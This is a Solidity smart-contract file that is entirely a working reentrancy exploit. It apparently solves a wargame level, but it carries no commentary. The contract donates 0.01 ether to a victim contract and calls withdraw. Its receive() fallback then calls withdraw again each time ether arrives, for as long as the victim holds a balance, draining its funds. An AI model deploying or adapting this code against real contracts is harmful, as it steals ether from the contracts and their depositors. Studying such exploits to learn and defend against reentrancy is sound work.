// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IReentranceWithdraw {
    function withdraw(uint256) external;
}

interface IReentranceDonate {
    function donate(address _to) external payable ;
}
contract ReentranceAttacker{
    address public victimContractAddr;
    uint256 immutable i_attackAmount = 0.01 ether;
    constructor(address _victimContractAddr)public {
        victimContractAddr = _victimContractAddr;
    }

    function donate() external  payable{
        IReentranceDonate(victimContractAddr).donate{value:i_attackAmount}(address(this));
    } 

    function attack() external {
        IReentranceWithdraw(victimContractAddr).withdraw(i_attackAmount);
    }

    receive() external payable {
        if(victimContractAddr.balance>0){
            IReentranceWithdraw(victimContractAddr).withdraw(i_attackAmount);
        }
    }

    
}